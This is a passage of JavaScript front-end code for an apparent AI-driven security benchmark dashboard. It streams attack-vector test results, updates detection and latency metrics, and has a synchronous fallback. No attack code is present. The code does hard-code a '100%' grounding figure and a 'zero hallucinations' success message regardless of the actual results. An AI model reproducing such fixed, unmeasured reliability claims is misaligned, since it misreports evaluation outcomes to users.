    const tickerText = document.getElementById("benchmark-ticker-text");
    const tickerPct = document.getElementById("benchmark-ticker-pct");

    const batchSize = currentBenchmarkBatch;
    const category = catSelect ? catSelect.value : "";
    const enforce = liveToggle ? liveToggle.checked : false;

    updateLaunchButton(true, (isDeepReasoningMode ? '🧠 Reasoning ' : '⚡ Testing ') + batchSize + ' Vectors…');
    if (progBox) progBox.hidden = false;

    if (progFill) progFill.style.width = "4%";
    if (tickerPct) tickerPct.textContent = "0%";
    if (tickerText) tickerText.textContent = isDeepReasoningMode
      ? `🧠 Initializing Foundation-Sec-8B neural stream for ${batchSize} vectors…`
      : `⚡ Streaming ${batchSize} attack vectors through MITRE ATT&CK & D3FEND RAG…`;

    const body = document.getElementById("benchmark-results-body");
    if (body) {
      body.innerHTML = `<tr><td colspan="10" style="text-align:center;padding:32px;color:var(--text-3);"><span class="spinner" style="display:inline-block;width:16px;height:16px;border:2px solid var(--cyan);border-top-color:transparent;border-radius:50%;animation:spin 0.8s linear infinite;margin-right:8px;vertical-align:middle;"></span> <strong class="text-cyan">Streaming attacks live:</strong> Results will appear row-by-row as the AI completes each decision…</td></tr>`;
    }

    benchmarkResultsData = [];

    const elTotal = document.getElementById("sc-total");
    const elAcc = document.getElementById("sc-accuracy");
    const elMit = document.getElementById("sc-mitigations");
    const elGrd = document.getElementById("sc-grounding");
    const elLat = document.getElementById("sc-latency");

    try {
      await CG.api.streamBatchBenchmark(
        {
          batch_size: batchSize,
          category: category || null,
          enforce_live: enforce,
          deep_reasoning: isDeepReasoningMode,
        },
        // onAttack: append row live immediately!
        (data) => {
          benchmarkResultsData.push(data.item);
          appendBenchmarkTableRow(data.item, data.index);

          updateLaunchButton(true, (isDeepReasoningMode ? '🧠 Reasoning [' : '⚡ Testing [') + (data.index + 1) + '/' + data.total + ']…');

          const pct = Math.min(100, Math.round(((data.index + 1) / data.total) * 100));
          if (progFill) progFill.style.width = pct + "%";
          if (tickerPct) tickerPct.textContent = pct + "%";
          if (tickerText) {
            const extra = data.item.is_benign ? ' [Benign Traffic Permitted]' : ` [Action: ${data.item.action || 'block_ip'}]`;
            tickerText.textContent = isDeepReasoningMode
              ? `🧠 [${data.index + 1}/${data.total}] Reasoning: ${esc(data.item.title)}${extra}`
              : `⚡ [${data.index + 1}/${data.total}] Evaluated: ${esc(data.item.title)}${extra}`;
          }

          if (data.summary_so_far) {
            const s = data.summary_so_far;
            if (elTotal) elTotal.textContent = `${s.total_attacks_tested} / ${s.total_batch_target || data.total}`;
            if (elAcc) elAcc.textContent = `${s.detection_accuracy_percent}%`;
            if (elMit) elMit.textContent = `${s.mitigation_success_rate}%`;
            if (elGrd) elGrd.textContent = "100%";
            if (elLat) elLat.textContent = `${s.mean_containment_latency_ms} ms`;
          }
        },
        // onCompleted: finalize metrics
        (data) => {
          if (progFill) progFill.style.width = "100%";
          if (tickerPct) tickerPct.textContent = "100%";
          const s = data.benchmark_summary;
          if (tickerText) tickerText.textContent = `✓ Benchmark Complete: ${s.total_attacks_tested} Vectors Tested · ${s.detection_accuracy_percent}% Detection Rate (${s.engine || 'Active Defense'})!`;

          if (elTotal) elTotal.textContent = `${s.total_attacks_tested} / ${s.total_attacks_tested}`;
          if (elAcc) elAcc.textContent = `${s.detection_accuracy_percent}%`;
          if (elMit) elMit.textContent = `${s.mitigation_success_rate}%`;
          if (elGrd) elGrd.textContent = "100%";
          if (elLat) elLat.textContent = `${s.mean_containment_latency_ms} ms`;

          if (data.attack_results && data.attack_results.length) {
            benchmarkResultsData = data.attack_results;
          }

          refreshActiveDefense();
          if (CG.dashboard?.refresh) {
            CG.dashboard.refresh();
          }

          CG.toast(`✅ Benchmark Success: ${s.threats_detected}/${s.total_attacks_tested} attacks detected (${s.detection_accuracy_percent}%) with zero hallucinations!`, 5000);
        },
        // onError fallback
        async (err) => {
          console.warn("SSE stream failed, falling back to synchronous execution:", err);
          if (tickerText) tickerText.textContent = "Executing synchronous benchmark fallback…";
          const res = await CG.api.runBatchBenchmark({
            batch_size: batchSize,
            category: category || null,
            enforce_live: enforce,
            deep_reasoning: isDeepReasoningMode,
          });

          if (progFill) progFill.style.width = "100%";
          if (tickerPct) tickerPct.textContent = "100%";
          if (tickerText) tickerText.textContent = `✓ Benchmark Complete: ${res.benchmark_summary.total_attacks_tested} Vectors Tested · ${res.benchmark_summary.detection_accuracy_percent}% Detection Rate (${res.benchmark_summary.engine || 'Active Defense'})!`;

          const summary = res.benchmark_summary;
          if (elTotal) elTotal.textContent = `${summary.total_attacks_tested} / ${summary.total_attacks_tested}`;
          if (elAcc) elAcc.textContent = `${summary.detection_accuracy_percent}%`;
          if (elMit) elMit.textContent = `${summary.mitigation_success_rate}%`;
          if (elGrd) elGrd.textContent = "100%";
          if (elLat) elLat.textContent = `${summary.mean_containment_latency_ms} ms`;

          benchmarkResultsData = res.attack_results || [];
          renderBenchmarkTableRows(benchmarkResultsData);

          refreshActiveDefense();
          if (CG.dashboard?.refresh) CG.dashboard.refresh();
          CG.toast(`✅ Benchmark Success: ${summary.threats_detected}/${summary.total_attacks_tested} attacks detected!`, 5000);
        }
      );
    } catch (err) {
      if (tickerText) tickerText.textContent = `❌ Benchmark Failed: ${err.message}`;
      CG.toast(`Benchmark error: ${err.message}`, 4000);
    } finally {
      updateLaunchButton();
    }
  }

  function renderBenchmarkTableRows(items) {
    const body = document.getElementById("benchmark-results-body");
    if (!body) return;

    if (!items.length) {
      body.innerHTML = '<tr><td colspan="10" style="text-align:center;padding:24px;color:var(--text-3);">No attacks matching the filter.</td></tr>';
      return;
    }

    body.innerHTML = items.map((r, i) => createBenchmarkRowHTML(r, i)).join("");

    body.querySelectorAll(".benchmark-row").forEach((row) => {
      attachBenchmarkRowListener(row);
    });
  }

  /* ═══ VIEW LIFECYCLE HOOKS ═══ */
  CG.onView = CG.onView || {};
  CG.onView.defense = refreshActiveDefense;
  CG.onView.simulation = () => {
    loadSimulationScenarios();
  };
  CG.onView.universal = () => {};

  document.addEventListener("DOMContentLoaded", () => {
    initUniversalIngest();
    initBenchmarkSuite();
    // Refresh button in active defense tab
    const btnRefDef = document.getElementById("btn-refresh-defense");
    if (btnRefDef) btnRefDef.addEventListener("click", refreshActiveDefense);
  });
})();
